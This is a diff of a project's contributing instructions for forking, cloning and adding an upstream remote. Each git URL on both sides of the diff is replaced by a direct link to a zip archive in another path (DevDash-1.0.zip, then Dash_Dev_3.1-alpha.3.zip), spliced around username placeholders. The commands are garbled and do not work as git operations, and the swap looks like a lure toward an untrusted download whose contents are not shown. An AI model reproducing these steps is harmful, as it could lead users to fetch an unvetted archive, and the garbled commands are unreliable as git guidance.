@@ -5,7 +5,7 @@
 1. Fork project
 2. Clone project
 ```
-git clone https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/assets/DevDash-1.0.zip<Your Github Username>https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/assets/DevDash-1.0.zip .
+git clone https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/contact/Dash_Dev_3.1-alpha.3.zip<Your Github Username>https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/contact/Dash_Dev_3.1-alpha.3.zip .
 ```
 3. Check if your upstream is setup
 ```
@@ -13,14 +13,14 @@ git remote -v
 ```
 It should come something like this:
 ```
-origin  https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/assets/DevDash-1.0.zip<Your username>https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/assets/DevDash-1.0.zip (fetch)
-origin  https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/assets/DevDash-1.0.zip<Your username>https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/assets/DevDash-1.0.zip (push)
-upstream  https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/assets/DevDash-1.0.zip (fetch)
-upstream  https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/assets/DevDash-1.0.zip (push)
+origin  https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/contact/Dash_Dev_3.1-alpha.3.zip<Your username>https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/contact/Dash_Dev_3.1-alpha.3.zip (fetch)
+origin  https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/contact/Dash_Dev_3.1-alpha.3.zip<Your username>https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/contact/Dash_Dev_3.1-alpha.3.zip (push)
+upstream  https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/contact/Dash_Dev_3.1-alpha.3.zip (fetch)
+upstream  https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/contact/Dash_Dev_3.1-alpha.3.zip (push)
 ```
 If not, type
 ```
-git remote add upstream https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/assets/DevDash-1.0.zip
+git remote add upstream https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/contact/Dash_Dev_3.1-alpha.3.zip
 ```
 3. As soon as the event starts
 ```
